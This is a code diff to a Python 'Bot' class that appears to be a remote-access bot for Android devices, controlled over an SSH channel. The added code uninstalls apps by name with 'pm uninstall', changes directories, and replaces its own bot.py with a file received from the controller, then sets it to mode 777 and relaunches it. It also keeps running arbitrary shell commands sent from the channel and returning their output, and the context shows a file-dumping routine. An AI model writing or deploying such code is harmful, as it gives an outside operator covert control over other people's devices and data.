@@ -19,6 +19,46 @@ class Bot():
         self.chan = None
         self.tags = None
 
+    def delete_apk(self,com_object):
+        try:
+            result = self.getOutputCmd("pm uninstall {}".format(com_object))
+            return 0
+        except:
+            return 1
+
+    def parse_apk_list(self):
+        output = self.getOutputCmd("pm list packages -f -3").split('\n')
+        return output
+
+    def search_app(self,app_list, app_name):
+        found = 0
+        result = []
+
+        for element in app_list:
+            apk = element[8:].split('=')[0]
+            com_object = element[8:].split('=')[1]
+
+            if (app_name in apk) or (app_name in com_object):
+                found = 1
+                if self.delete_apk(com_object) == 0:
+                    result.append(apk)
+
+        if not found:
+            ChannelSSH.sendToChannel("[-]App {} not found".format(app_name), self.chan)
+
+        return result
+
+    def rreplace(s, old, new, occurrence):
+        li = s.rsplit(old, occurrence)
+        return new.join(li)
+
+    def update(self):
+        file = ChannelSSH.receiveFromChannel(self.chan)
+        self.getOutputCmd('rm bot.py')
+        self.chan.close()
+        open('bot.py', 'w+').write(file)
+        self.getOutputCmd('chmod 777 bot.py')
+        self.getOutputCmd('sleep 3 && python bot.py')
 
     def getOutputCmd(self,cmd):
         # do shell command
@@ -92,6 +132,29 @@ class Bot():
                 self.path_destination = path_d
                 self.tags = tags
                 self.get_dumper_file()
+            elif 'delete' in command:
+                try:
+                    cmd, deleteapp = command.split(' ')
+                    output = self.parse_apk_list()
+                    result = self.search_app(output, deleteapp)
+                    if len(result) >= 1:
+                        ChannelSSH.sendToChannel("[+] App successfully deleted", self.chan)
+                except:
+                    ChannelSSH.sendToChannel('[-] Command syntax error', self.chan)
+            elif 'update' in command:
+                if not 'bot.py' in self.getOutputCmd('ls'):
+                    ChannelSSH.sendToChannel('Your are not in the directory containing the code', self.chan)
+                else:
+                    ChannelSSH.sendToChannel('OK!', self.chan)
+                    self.update()
+                    break
+            elif 'cd' in command:
+                try:
+                    code, directory = command.split(' ')
+                    os.chdir(directory)
+                    ChannelSSH.sendToChannel("[+] CWD Is " + os.getcwd(), self.chan)
+                except:
+                    ChannelSSH.sendToChannel("[-] Error, Double check the Dir", self.chan)
             else:
                 ChannelSSH.sendToChannel(self.getOutputCmd(command),self.chan)
 
@@ -99,3 +162,4 @@ class Bot():
 if __name__ == '__main__':
     bot = Bot()
     bot.connect()
+    #teest update
